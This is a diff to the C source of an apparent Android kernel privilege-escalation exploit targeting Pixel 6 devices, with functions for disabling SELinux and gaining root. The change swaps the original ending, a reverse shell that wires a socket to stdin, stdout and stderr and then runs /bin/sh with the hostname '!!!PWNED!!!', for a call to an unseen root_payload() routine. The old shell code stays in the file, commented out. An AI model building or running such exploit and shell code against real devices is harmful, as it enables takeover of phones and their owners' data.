@@ -35,6 +35,9 @@
 #include "rw.h"
 #include "light_cond.h"
 
+#include <root_payload.h>
+
+
 
 int disable_selinux_using_enforce() {
     if (getuid() != 0) {
@@ -219,27 +222,29 @@ int pixel6_root(struct rw_info *rw) {
     LOG("Reset process state\n");
     rw->kclose(rw);
 
-#ifdef REVERSE_SHELL
-    /* You can test by issuing "adb reverse tcp:1337 tcp:1337" 
-     * and starting a server on your host on port 1337.
-     */
-    int sock = connect_to("127.0.0.1", 1337);
-    if (sock == -1) {
-        LOG("Could not open socket connection\n");
-        return 0;
-    }
-#endif
+    root_payload();
 
-    LOG("Spawning root shell\n");
+// #ifdef REVERSE_SHELL
+//     /* You can test by issuing "adb reverse tcp:1337 tcp:1337" 
+//      * and starting a server on your host on port 1337.
+//      */
+//     int sock = connect_to("127.0.0.1", 1337);
+//     if (sock == -1) {
+//         LOG("Could not open socket connection\n");
+//         return 0;
+//     }
+// #endif
 
-#ifdef REVERSE_SHELL
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-#endif
+//     LOG("Spawning root shell\n");
 
-    char *envp[] = {"PATH=/sbin:/system/sbin:/product/bin:/apex/com.android.runtime/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin", "ANDROID_DATA=/data", "HOSTNAME=!!!PWNED!!!", NULL};
-    execle("/bin/sh", "/bin/sh", NULL, envp);
+// #ifdef REVERSE_SHELL
+//     dup2(sock, 0);
+//     dup2(sock, 1);
+//     dup2(sock, 2);
+// #endif
+
+//     char *envp[] = {"PATH=/sbin:/system/sbin:/product/bin:/apex/com.android.runtime/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin", "ANDROID_DATA=/data", "HOSTNAME=!!!PWNED!!!", NULL};
+//     execle("/bin/sh", "/bin/sh", NULL, envp);
     /* Unreachable. */
     return 0;
 }
